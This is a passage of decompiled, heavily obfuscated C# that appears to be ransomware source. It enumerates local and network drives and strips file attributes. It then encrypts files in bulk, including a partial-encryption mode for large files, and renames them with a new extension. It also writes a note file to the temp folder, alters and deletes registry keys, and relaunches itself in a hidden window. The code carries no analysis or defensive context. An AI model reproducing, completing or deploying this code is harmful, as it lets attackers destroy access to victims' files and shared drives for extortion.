					registryKey.DeleteSubKey(PbsdnvfpwWRvGCs(getString_0(107387727)));
					registryKey.Close();
				}
				string_ = TfBMtOaYnyXfeqqRN(getString_0(107387874));
				registryKey = Registry.LocalMachine.OpenSubKey(PbsdnvfpwWRvGCs(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(PbsdnvfpwWRvGCs(getString_0(107387777)));
					registryKey.Close();
				}
				string_ = TfBMtOaYnyXfeqqRN(getString_0(107387792));
				registryKey = Registry.LocalMachine.OpenSubKey(PbsdnvfpwWRvGCs(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(PbsdnvfpwWRvGCs(getString_0(107387777)));
					registryKey.Close();
				}
				string_ = TfBMtOaYnyXfeqqRN(getString_0(107387792));
				registryKey = Registry.CurrentUser.OpenSubKey(PbsdnvfpwWRvGCs(string_), writable: true);
				if (registryKey != null)
				{
					registryKey.DeleteSubKey(PbsdnvfpwWRvGCs(getString_0(107387777)));
					registryKey.Close();
				}
			}
			catch
			{
			}
			xNqiyNeJTVFGU(PbsdnvfpwWRvGCs(getString_0(107387231)), PbsdnvfpwWRvGCs(getString_0(107387246)));
			xNqiyNeJTVFGU(PbsdnvfpwWRvGCs(getString_0(107387165)), PbsdnvfpwWRvGCs(TfBMtOaYnyXfeqqRN(getString_0(107387156))));
			xNqiyNeJTVFGU(PbsdnvfpwWRvGCs(getString_0(107387165)), PbsdnvfpwWRvGCs(getString_0(107387010)));
			xNqiyNeJTVFGU(PbsdnvfpwWRvGCs(getString_0(107387493)), PbsdnvfpwWRvGCs(getString_0(107387444)));
		}
		catch
		{
		}
	}

	public static void XZXEHUgcqrufd(string string_0, byte[] byte_0)
	{
		try
		{
			byte[] bytes = Encoding.ASCII.GetBytes(PbsdnvfpwWRvGCs(getString_0(107387403)));
			using FileStream fileStream = new FileStream(string_0, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
			fileStream.Write(byte_0, 0, byte_0.Length);
			fileStream.Write(bytes, 0, bytes.Length);
		}
		catch (Exception)
		{
		}
	}

	public static void XoFivSFAPFl()
	{
		string string_ = TfBMtOaYnyXfeqqRN(getString_0(107387378));
		try
		{
			RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(PbsdnvfpwWRvGCs(string_), writable: true);
			if (registryKey != null)
			{
				registryKey.SetValue(PbsdnvfpwWRvGCs(getString_0(107387265)), 1, RegistryValueKind.DWord);
				registryKey.Close();
			}
		}
		catch
		{
		}
	}

	[DllImport("mpr.dll")]
	private static extern int WNetGetUniversalNameA(string string_0, int int_0, IntPtr intptr_0, ref int int_1);

	private static string xHwQBPIClVAFcuS(string jyXjQtARhTMzoJ, int tndxKtSgKYtg = 2000)
	{
		IntPtr intPtr;
		try
		{
			intPtr = Marshal.AllocHGlobal(tndxKtSgKYtg);
		}
		catch (OutOfMemoryException)
		{
			return null;
		}
		try
		{
			if (WNetGetUniversalNameA(jyXjQtARhTMzoJ, 1, intPtr, ref tndxKtSgKYtg) != 0)
			{
				return null;
			}
			return Marshal.PtrToStringAnsi(Marshal.ReadIntPtr(intPtr));
		}
		catch (Exception)
		{
			return null;
		}
		finally
		{
			Marshal.FreeHGlobal(intPtr);
		}
	}

	public static void OQGiATnqshpg()
	{
		xNqiyNeJTVFGU(getString_0(107396474), PbsdnvfpwWRvGCs(getString_0(107386720)));
		string text = PbsdnvfpwWRvGCs(getString_0(107386526));
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = getString_0(107388052) + text + getString_0(107388052) + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = getString_0(107396474);
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	public static void kstUyDfByMqYOzIx(string string_0)
	{
		try
		{
			FileAttributes attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.ReadOnly) == FileAttributes.ReadOnly)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.ReadOnly);
			}
			attributes = File.GetAttributes(string_0);
			if ((attributes & FileAttributes.Hidden) == FileAttributes.Hidden)
			{
				File.SetAttributes(string_0, attributes & ~FileAttributes.Hidden);
			}
		}
		catch (Exception ex)
		{
			if (CCDyMIHlAe)
			{
				try
				{
					File.AppendAllText(dtHHyJMWMTcTg, getString_0(107386973) + string_0 + getString_0(107386964) + ex.Message + getString_0(107395711));
					return;
				}
				catch (Exception)
				{
					return;
				}
			}
		}
	}

	public static string oZZPobIwxSNjCO()
	{
		OperatingSystem oSVersion = Environment.OSVersion;
		Version version = oSVersion.Version;
		string text = getString_0(107389241);
		if (oSVersion.Platform == PlatformID.Win32Windows)
		{
			switch (version.Minor)
			{
			case 90:
				text = getString_0(107386875);
				break;
			case 10:
				text = ((!(version.Revision.ToString() == getString_0(107386930))) ? getString_0(107386880) : getString_0(107386921));
				break;
			case 0:
				text = getString_0(107386903);
				break;
			}
		}
		else if (oSVersion.Platform == PlatformID.Win32NT)
		{
			switch (version.Major)
			{
			case 3:
				text = getString_0(107386870);
				break;
			case 4:
				text = getString_0(107386889);
				break;
			case 5:
				text = ((version.Minor != 0) ? getString_0(107386839) : getString_0(107386848));
				break;
			case 6:
				text = ((version.Minor != 0) ? ((version.Minor != 1) ? ((version.Minor != 2) ? getString_0(107386815) : getString_0(107386852)) : getString_0(107386857)) : getString_0(107386866));
				break;
			case 10:
				text = getString_0(107386810);
				break;
			}
		}
		if (text != getString_0(107389241))
		{
			text = getString_0(107386805) + text;
			if (oSVersion.ServicePack != getString_0(107389241))
			{
				text = text + getString_0(107387669) + oSVersion.ServicePack;
			}
		}
		return text;
	}

	public static string iqbhckCLJPzmcb(string string_0)
	{
		string text = Path.GetTempPath() + getString_0(107394852);
		try
		{
			if (!File.Exists(text))
			{
				using StreamWriter streamWriter = new StreamWriter(text);
				streamWriter.WriteLine(PbsdnvfpwWRvGCs(getString_0(107394819)));
				streamWriter.WriteLine(getString_0(107395711));
				streamWriter.WriteLine(PbsdnvfpwWRvGCs(getString_0(107389809)));
				streamWriter.WriteLine(string_0);
				if (YazilaoopZ)
				{
					streamWriter.WriteLine(getString_0(107395711));
					streamWriter.WriteLine(PbsdnvfpwWRvGCs(getString_0(107389683)));
					streamWriter.WriteLine(yWTIBbUKdpiy.RuDYtoNcCxI());
				}
			}
			else
			{
				string text2 = File.ReadAllText(text);
				if (!text2.Contains(string_0) && !PAOJgADrbjEa)
				{
					File.AppendAllText(text, getString_0(107389682) + string_0);
				}
			}
			return text;
		}
		catch (Exception ex)
		{
			if (CCDyMIHlAe)
			{
				try
				{
					File.AppendAllText(dtHHyJMWMTcTg, getString_0(107386824) + ex.Message + getString_0(107395711));
				}
				catch (Exception)
				{
				}
			}
		}
		return text;
	}

	private static void LeefKZPaDd(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		MCSuzJljyGwrZ.uILPrdIBlgQjre CS_0024_003C_003E8__locals0 = new MCSuzJljyGwrZ();
		CS_0024_003C_003E8__locals0.nTBZXeQINsMZ = string_1;
		CS_0024_003C_003E8__locals0.CToRljeBfHM = string_2;
		CS_0024_003C_003E8__locals0.hSfGYaylYziGu = string_3;
		CS_0024_003C_003E8__locals0.SrUtXYDUZSmg = string_4;
		if (RaNDyCdUClri && !oZZPobIwxSNjCO().Contains(getString_0(107386839)) && !oZZPobIwxSNjCO().Contains(getString_0(107386767)))
		{
			mkGTOXcJBjA.AQxYtYywpEIpR();
		}
		bGfpmpYMCsNkyjcK = Convert.FromBase64String(CS_0024_003C_003E8__locals0.hSfGYaylYziGu);
		DriveInfo[] array = null;
		if (string_0[0] == getString_0(107395959))
		{
			try
			{
				array = DriveInfo.GetDrives();
			}
			catch (Exception)
			{
			}
			if (array.Length > 0)
			{
				for (int i = 0; i < array.Length; i++)
				{
					if (!array[i].IsReady || array[i].DriveType == DriveType.CDRom)
					{
						continue;
					}
					if (array[i].DriveType == DriveType.Network)
					{
						try
						{
							string text = xHwQBPIClVAFcuS(array[i].Name);
							if (!string.IsNullOrEmpty(text) && !ZmKssmQIdPi.Contains(text))
							{
								ZmKssmQIdPi.Add(text);
							}
							else if (!ZmKssmQIdPi.Contains(array[i].Name))
							{
								ZmKssmQIdPi.Add(array[i].Name);
							}
						}
						catch (Exception)
						{
							if (!ZmKssmQIdPi.Contains(array[i].Name))
							{
								ZmKssmQIdPi.Add(array[i].Name);
							}
						}
					}
					else if (!ZmKssmQIdPi.Contains(array[i].Name))
					{
						ZmKssmQIdPi.Add(array[i].Name);
					}
				}
			}
		}
		else
		{
			for (int i = 0; i < string_0.Length; i++)
			{
				if (!ZmKssmQIdPi.Contains(string_0[i]))
				{
					ZmKssmQIdPi.Add(string_0[i]);
				}
			}
		}
		if (ZmKssmQIdPi.Contains(PbsdnvfpwWRvGCs(getString_0(107386210))) && lMZoDXXDrlQgS == getString_0(107396791))
		{
			ZmKssmQIdPi.Remove(PbsdnvfpwWRvGCs(getString_0(107386210)));
		}
		Parallel.ForEach(ZmKssmQIdPi, delegate(string string_0)
		{
			CS_0024_003C_003E8__locals0 = new MCSuzJljyGwrZ.uILPrdIBlgQjre();
			CS_0024_003C_003E8__locals0.kEzRsJGIECQHC = CS_0024_003C_003E8__locals0;
			CS_0024_003C_003E8__locals0.UWCxsCbMhIkWpfJ = string_0;
			if (FRObTCxcUY && !oZZPobIwxSNjCO().Contains(MCSuzJljyGwrZ.getString_0(107386849)) && !oZZPobIwxSNjCO().Contains(MCSuzJljyGwrZ.getString_0(107386777)))
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					if (new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
					{
						sMlBAtMqAgeMq(WindowsIdentity.GetCurrent().Name, CS_0024_003C_003E8__locals0.UWCxsCbMhIkWpfJ);
					}
				});
				thread.Priority = ThreadPriority.Normal;
				thread.IsBackground = true;
				thread.Start();
			}
			if (rmNaxrdaErS == MCSuzJljyGwrZ.getString_0(107396801))
			{
				Thread thread2 = new Thread((ThreadStart)delegate
				{
					uBTjgvutOlsTJ(CS_0024_003C_003E8__locals0.UWCxsCbMhIkWpfJ, CS_0024_003C_003E8__locals0.kEzRsJGIECQHC.nTBZXeQINsMZ, CS_0024_003C_003E8__locals0.kEzRsJGIECQHC.SrUtXYDUZSmg, CS_0024_003C_003E8__locals0.kEzRsJGIECQHC.CToRljeBfHM, CS_0024_003C_003E8__locals0.kEzRsJGIECQHC.hSfGYaylYziGu);
				});
				thread2.Priority = ThreadPriority.Normal;
				thread2.IsBackground = false;
				thread2.Start();
				thread2.Join();
			}
			else
			{
				uBTjgvutOlsTJ(CS_0024_003C_003E8__locals0.UWCxsCbMhIkWpfJ, CS_0024_003C_003E8__locals0.nTBZXeQINsMZ, CS_0024_003C_003E8__locals0.SrUtXYDUZSmg, CS_0024_003C_003E8__locals0.CToRljeBfHM, CS_0024_003C_003E8__locals0.hSfGYaylYziGu);
			}
		});
	}

	public static void uBTjgvutOlsTJ(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		List<string> list = new List<string>();
		List<string> list2 = new List<string>();
		list2.Add(getString_0(107389241));
		List<string> list3 = list2;
		if (xEVAdQHTwaeaG == getString_0(107396615))
		{
			if (VVNvuJuOCGKqN == getString_0(107396791) && new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator) && CRggSgCOOkjunf(string_0))
			{
				KtAmyCjzFi ktAmyCjzFi = null;
				try
				{
					ktAmyCjzFi = new KtAmyCjzFi(string_0.Replace(getString_0(107397225), getString_0(107389241)));
				}
				catch
				{
					list = DrqYGjBvTosyB(string_0, string_1, string_2, string_3, string_4);
					return;
				}
				try
				{
					bDKhtlXUmUD(ktAmyCjzFi.ToArray().ToList(), string_1, string_2, string_3, string_4);
					return;
				}
				catch (Exception)
				{
					list = DrqYGjBvTosyB(string_0, string_1, string_2, string_3, string_4);
					return;
				}
			}
			list = DrqYGjBvTosyB(string_0, string_1, string_2, string_3, string_4);
			return;
		}
		list = dXtpYLlAbMp.SearchFiles(string_0);
		foreach (string text in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					int num = 0;
					while (num < string_3.Length)
					{
						string value = string_3[num];
						if (!item.EndsWith(value))
						{
							num++;
							continue;
						}
						goto IL_0495;
					}
				}
				if ((brYmtXjlZIq == getString_0(107396615) && !item.EndsWith(text)) || SNtBTLidlROtoV.Contains(item))
				{
					continue;
				}
				if (BBqvZtJMKtZyzF == getString_0(107396791))
				{
					try
					{
						if (uruahRFIszrntX.bURwEzWcMZKaoi(item))
						{
							uruahRFIszrntX.BBxxokkeNIlNHfR(item);
						}
					}
					catch
					{
					}
				}
				SNtBTLidlROtoV.Add(item);
				if (!HMEbcaxMfcYzgl.Contains(Path.GetDirectoryName(item)))
				{
					HMEbcaxMfcYzgl.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (QOKbVStgyeVL == getString_0(107396791) && fileStream.Length > Convert.ToInt32(UawyhGBHBLgS) * 1024 * 1024 && !list3.Contains(text))
					{
						if (DXDIUZMazYGZy == getString_0(107396791))
						{
							foreach (string item2 in YoPwmbBPpdD)
							{
								if (item.ToLower().EndsWith(item2) && HFFrRFIpQgjXI == getString_0(107396791))
								{
									if (Convert.ToInt32(PZYHNDUWTf) * 1024 * 1024 > fileStream.Length)
									{
										try
										{
											yWTIBbUKdpiy.ybntlhJHhisLb(getString_0(107389866), getString_0(107389861), getString_0(107389816), item);
										}
										catch
										{
										}
									}
								}
								else if (item.ToLower().EndsWith(item2) && HFFrRFIpQgjXI == getString_0(107396615))
								{
									try
									{
										yWTIBbUKdpiy.ybntlhJHhisLb(getString_0(107389866), getString_0(107389861), getString_0(107389816), item);
									}
									catch
									{
									}
								}
							}
						}
						fileStream.Dispose();
						byte[] byte_ = NQdDIFAnEzVM.KQanXSigbuDh(item, Convert.ToInt32(UawyhGBHBLgS) * 1024 * 1024);
						byte[] aaZhmxjLrXnGZ = NQdDIFAnEzVM.SvtZMRYDytMixf(byte_, Convert.FromBase64String(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						NQdDIFAnEzVM.EHTmbBVFpgxa(item, aaZhmxjLrXnGZ);
						if (string_2 != getString_0(107386201))
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != getString_0(107386201))
					{
						WyOQIuKbfF(item, item + string_2, bGfpmpYMCsNkyjcK);
					}
					else
					{
						WyOQIuKbfF(item, item + getString_0(107386196), bGfpmpYMCsNkyjcK);
					}
				}
				catch (Exception)
				{
				}
				IL_0495:;
			}
		}
	}

	public static void bDKhtlXUmUD(List<string> list_0, string[] string_0, string string_1, string[] string_2, string string_3)
	{
		mDsrdwsfBAgqx.SmDDBVlBSoLlZfP CS_0024_003C_003E8__locals0 = new mDsrdwsfBAgqx();
		CS_0024_003C_003E8__locals0.vJUzSMoRbycwzG = list_0;
		CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ = string_1;
		CS_0024_003C_003E8__locals0.nBTsxqqCcIrA = string_2;
		CS_0024_003C_003E8__locals0.MXXPCoXZKEzPC = string_3;
		CS_0024_003C_003E8__locals0.MWjzSWdUTiapH = new List<string> { getString_0(107389241) };
		if (brYmtXjlZIq == getString_0(107396615))
		{
			Parallel.ForEach(string_0, delegate(string string_0)
			{
				using List<string>.Enumerator enumerator2 = CS_0024_003C_003E8__locals0.vJUzSMoRbycwzG.GetEnumerator();
				while (enumerator2.MoveNext())
				{
					mDsrdwsfBAgqx.bKLeOnnwOsJw CS_0024_003C_003E8__locals1 = new mDsrdwsfBAgqx.bKLeOnnwOsJw();
					CS_0024_003C_003E8__locals1.irnVJvnuIedJmu = CS_0024_003C_003E8__locals0;
					CS_0024_003C_003E8__locals1.ldrdWbhdALtRA = enumerator2.Current;
					if (((!CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.Contains(mDsrdwsfBAgqx.getString_0(107389347)) && !CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.Contains(mDsrdwsfBAgqx.getString_0(107388778)) && !CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.Contains(mDsrdwsfBAgqx.getString_0(107388745)) && !CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.ToLower().Contains(mDsrdwsfBAgqx.getString_0(107388760)) && !CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.ToLower().Contains(mDsrdwsfBAgqx.getString_0(107388715)) && !CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.Contains(mDsrdwsfBAgqx.getString_0(107388690)) && !CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.Contains(mDsrdwsfBAgqx.getString_0(107388701)) && !CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.ToLower().Contains(mDsrdwsfBAgqx.getString_0(107388656)) && !CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.ToLower().Contains(mDsrdwsfBAgqx.getString_0(107388675)) && !CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.ToLower().Contains(mDsrdwsfBAgqx.getString_0(107388638)) && !CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.ToLower().Contains(mDsrdwsfBAgqx.getString_0(107388629)) && !CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.ToLower().Contains(mDsrdwsfBAgqx.getString_0(107388612)) && !CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.ToLower().Contains(mDsrdwsfBAgqx.getString_0(107388554)) && !CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.ToLower().Contains(mDsrdwsfBAgqx.getString_0(107388565))) || CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.Contains(PbsdnvfpwWRvGCs(mDsrdwsfBAgqx.getString_0(107389052)))) && !CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.Contains(mDsrdwsfBAgqx.getString_0(107388979)) && !CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.Contains(mDsrdwsfBAgqx.getString_0(107388994)) && !CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.Contains(mDsrdwsfBAgqx.getString_0(107388945)) && !CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.Contains(mDsrdwsfBAgqx.getString_0(107388960)) && !CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.Contains(mDsrdwsfBAgqx.getString_0(107388911)) && !CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.Contains(mDsrdwsfBAgqx.getString_0(107388926)) && !CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.Contains(mDsrdwsfBAgqx.getString_0(107388877)) && !CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.Contains(mDsrdwsfBAgqx.getString_0(107388892)) && !CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.Contains(mDsrdwsfBAgqx.getString_0(107388847)) && !CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.Contains(mDsrdwsfBAgqx.getString_0(107388858)) && !CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.ToLower().Contains(mDsrdwsfBAgqx.getString_0(107388813)) && !CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.ToLower().Contains(mDsrdwsfBAgqx.getString_0(107388832)) && !CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.ToLower().Contains(mDsrdwsfBAgqx.getString_0(107388271)) && !CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.ToLower().Contains(mDsrdwsfBAgqx.getString_0(107388286)) && !CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.Contains(PbsdnvfpwWRvGCs(mDsrdwsfBAgqx.getString_0(107388237))) && !CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.Contains(mDsrdwsfBAgqx.getString_0(107388212)) && !CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.Contains(mDsrdwsfBAgqx.getString_0(107396229)) && !CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.Contains(mDsrdwsfBAgqx.getString_0(107388199)) && !CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.EndsWith(CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ) && !CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.EndsWith(mDsrdwsfBAgqx.getString_0(107388174)) && !CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.EndsWith(mDsrdwsfBAgqx.getString_0(107388169)) && !CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.EndsWith(mDsrdwsfBAgqx.getString_0(107388196)) && !CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.EndsWith(mDsrdwsfBAgqx.getString_0(107388191)) && !CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.Contains(mDsrdwsfBAgqx.getString_0(107388186)) && !CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.Contains(RoiBxbbYOpTnzdF) && !CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.Contains(dtHHyJMWMTcTg) && !CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.Contains(muQSQoYNOwJp))
					{
						if (CS_0024_003C_003E8__locals0.nBTsxqqCcIrA.Length != 0)
						{
							string[] nBTsxqqCcIrA2 = CS_0024_003C_003E8__locals0.nBTsxqqCcIrA;
							int num2 = 0;
							while (num2 < nBTsxqqCcIrA2.Length)
							{
								string value2 = nBTsxqqCcIrA2[num2];
								if (!CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.EndsWith(value2))
								{
									num2++;
									continue;
								}
								goto IL_10b9;
							}
						}
						try
						{
							if (CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.EndsWith(CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ))
							{
								goto IL_10b9;
							}
						}
						catch (Exception)
						{
							goto IL_10b9;
						}
						if (CS_0024_003C_003E8__locals1.ldrdWbhdALtRA.EndsWith(string_0) && !SNtBTLidlROtoV.Contains(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA))
						{
							if (BBqvZtJMKtZyzF == mDsrdwsfBAgqx.getString_0(107396809))
							{
								try
								{
									if (uruahRFIszrntX.bURwEzWcMZKaoi(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA))
									{
										uruahRFIszrntX.BBxxokkeNIlNHfR(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA);
									}
								}
								catch
								{
								}
							}
							SNtBTLidlROtoV.Add(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA);
							Thread thread3 = new Thread((ThreadStart)delegate
							{
								try
								{
									if (fgLeGcGjPkpRXH)
									{
										Console.WriteLine(mDsrdwsfBAgqx.bKLeOnnwOsJw.getString_0(107402704) + CS_0024_003C_003E8__locals1.ldrdWbhdALtRA + mDsrdwsfBAgqx.bKLeOnnwOsJw.getString_0(107402601) + new FileInfo(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA).Length + mDsrdwsfBAgqx.bKLeOnnwOsJw.getString_0(107402580));
										Console.WriteLine(mDsrdwsfBAgqx.bKLeOnnwOsJw.getString_0(107402679), SNtBTLidlROtoV.Count, qXIAEocyZgLqByS, LVKhJcfUHGhpJNXz);
										Console.WriteLine(mDsrdwsfBAgqx.bKLeOnnwOsJw.getString_0(107402654), lBGXxmsJjqv.Elapsed);
										Console.WriteLine(mDsrdwsfBAgqx.bKLeOnnwOsJw.getString_0(107402571));
									}
								}
								catch
								{
								}
							});
							thread3.Priority = ThreadPriority.Normal;
							thread3.IsBackground = true;
							thread3.Start();
							if (!HMEbcaxMfcYzgl.Contains(Path.GetDirectoryName(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA)))
							{
								HMEbcaxMfcYzgl.Add(Path.GetDirectoryName(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA));
							}
							kstUyDfByMqYOzIx(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA);
							try
							{
								new SnjLOUpfRioti().fwTUnyzIwakYqxR(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA);
							}
							catch
							{
							}
							try
							{
								using FileStream fileStream2 = new FileStream(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA, FileMode.Open, FileAccess.Write);
								if (!fileStream2.CanWrite)
								{
									try
									{
										if (fgLeGcGjPkpRXH)
										{
											Console.WriteLine(mDsrdwsfBAgqx.getString_0(107403155) + CS_0024_003C_003E8__locals1.ldrdWbhdALtRA + mDsrdwsfBAgqx.getString_0(107402598) + new FileInfo(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA).Length + mDsrdwsfBAgqx.getString_0(107402577));
											Console.WriteLine(mDsrdwsfBAgqx.getString_0(107402568));
										}
									}
									catch
									{
									}
									xNqiyNeJTVFGU(PbsdnvfpwWRvGCs(mDsrdwsfBAgqx.getString_0(107402495)), mDsrdwsfBAgqx.getString_0(107388070) + CS_0024_003C_003E8__locals1.ldrdWbhdALtRA + mDsrdwsfBAgqx.getString_0(107388070) + PbsdnvfpwWRvGCs(mDsrdwsfBAgqx.getString_0(107402438)) + mDsrdwsfBAgqx.getString_0(107388070) + Environment.UserName + mDsrdwsfBAgqx.getString_0(107388070) + PbsdnvfpwWRvGCs(mDsrdwsfBAgqx.getString_0(107402453)));
								}
							}
							catch (Exception ex14)
							{
								if (CCDyMIHlAe)
								{
									try
									{
										File.AppendAllText(dtHHyJMWMTcTg, mDsrdwsfBAgqx.getString_0(107386991) + CS_0024_003C_003E8__locals1.ldrdWbhdALtRA + mDsrdwsfBAgqx.getString_0(107402428) + ex14.Message + mDsrdwsfBAgqx.getString_0(107395729));
									}
									catch (Exception)
									{
									}
								}
								continue;
							}
							try
							{
								try
								{
									if (new FileInfo(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA).Length != 0L)
									{
										goto end_IL_08b3;
									}
									goto end_IL_08b2;
									end_IL_08b3:;
								}
								catch (Exception ex14)
								{
									if (CCDyMIHlAe)
									{
										try
										{
											File.AppendAllText(dtHHyJMWMTcTg, mDsrdwsfBAgqx.getString_0(107386991) + CS_0024_003C_003E8__locals1.ldrdWbhdALtRA + mDsrdwsfBAgqx.getString_0(107402827) + ex14.Message + mDsrdwsfBAgqx.getString_0(107395729));
										}
										catch (Exception)
										{
										}
									}
									LVKhJcfUHGhpJNXz++;
									goto end_IL_08b2;
								}
								byte[] bytes2;
								if (!(QOKbVStgyeVL == mDsrdwsfBAgqx.getString_0(107396809)) || new FileInfo(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA).Length <= Convert.ToInt32(UawyhGBHBLgS) * 1024 * 1024 || CS_0024_003C_003E8__locals0.MWjzSWdUTiapH.Contains(string_0))
								{
									if (YazilaoopZ)
									{
										CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ = tltXBlUAjNeRsFxCp + CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ;
									}
									bytes2 = Encoding.ASCII.GetBytes(EXVykcHaTCNay);
									if (CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ != mDsrdwsfBAgqx.getString_0(107386219))
									{
										if (!UOlZmEwYRBbnfmvt)
										{
											if (!PAOJgADrbjEa)
											{
												fsRkhosBCvdFpjZ(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA, CS_0024_003C_003E8__locals1.ldrdWbhdALtRA + CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ, bGfpmpYMCsNkyjcK);
											}
											else
											{
												fsRkhosBCvdFpjZ(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA, CS_0024_003C_003E8__locals1.ldrdWbhdALtRA + CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ, Convert.FromBase64String(CS_0024_003C_003E8__locals0.MXXPCoXZKEzPC));
											}
										}
										else
										{
											try
											{
												if (!PAOJgADrbjEa)
												{
													TMqDmSiJWGfZdl(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA, CS_0024_003C_003E8__locals1.ldrdWbhdALtRA + CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ, bGfpmpYMCsNkyjcK, Convert.FromBase64String(sTQyJSLcZOIiC));
												}
												else
												{
													TMqDmSiJWGfZdl(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA, CS_0024_003C_003E8__locals1.ldrdWbhdALtRA + CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ, Convert.FromBase64String(CS_0024_003C_003E8__locals0.MXXPCoXZKEzPC), Convert.FromBase64String(sTQyJSLcZOIiC));
												}
											}
											catch (Exception ex14)
											{
												if (CCDyMIHlAe)
												{
													try
													{
														File.AppendAllText(dtHHyJMWMTcTg, mDsrdwsfBAgqx.getString_0(107386991) + CS_0024_003C_003E8__locals1.ldrdWbhdALtRA + mDsrdwsfBAgqx.getString_0(107386237) + ex14.Message + mDsrdwsfBAgqx.getString_0(107395729));
													}
													catch (Exception)
													{
													}
												}
												LVKhJcfUHGhpJNXz++;
												try
												{
													File.Move(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA + CS_0024_003C_003E8__locals0.MaDQWNsFQFSMFZ, CS_0024_003C_003E8__locals1.ldrdWbhdALtRA);
												}
												catch (Exception)
												{
												}
												goto end_IL_08b2;
											}
										}
									}
									else if (!UOlZmEwYRBbnfmvt)
									{
										if (!PAOJgADrbjEa)
										{
											fsRkhosBCvdFpjZ(CS_0024_003C_003E8__locals1.ldrdWbhdALtRA, CS_0024_003C_003E8__locals1.ldrdWbhdALtRA + mDsrdwsfBAgqx.getString_0(107386214), bGfpmpYMCsNkyjcK);
										}
										else
										{
